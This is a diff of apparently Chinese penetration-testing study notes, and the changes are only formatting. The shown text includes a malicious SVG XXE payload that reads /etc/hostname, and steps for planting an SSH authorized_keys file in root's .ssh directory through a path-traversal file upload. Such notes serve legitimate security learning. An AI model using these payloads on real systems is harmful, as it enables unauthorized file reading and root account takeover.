@@ -206,7 +206,11 @@ XXE in XML
 以恶意svg为例，一般尝试OOB外带注入的方式来判断最快
 
 ```xml
-<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
+<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
+  <text font-size="16" x="0" y="16">&xxe;</text>
+</svg>
 ```
 
 恶意的XXE文档生成：[docem](https://github.com/whitel1st/docem.git)
@@ -515,11 +519,11 @@ Enter same passphrase again:
 Your identification has been saved in fileup  
 Your public key has been saved in fileup.pub  
 ...  
-​  
+
 kali@kali:~$ cat fileup.pub > authorized_keys
 ```
 
-> 清单 37 - 为文件上传准备authorized_keys 文件
+> 为文件上传准备authorized_keys 文件
 
 使用相对路径 `../../../../../../../root/.ssh/authorized_keys` 上传它进行覆盖。
 
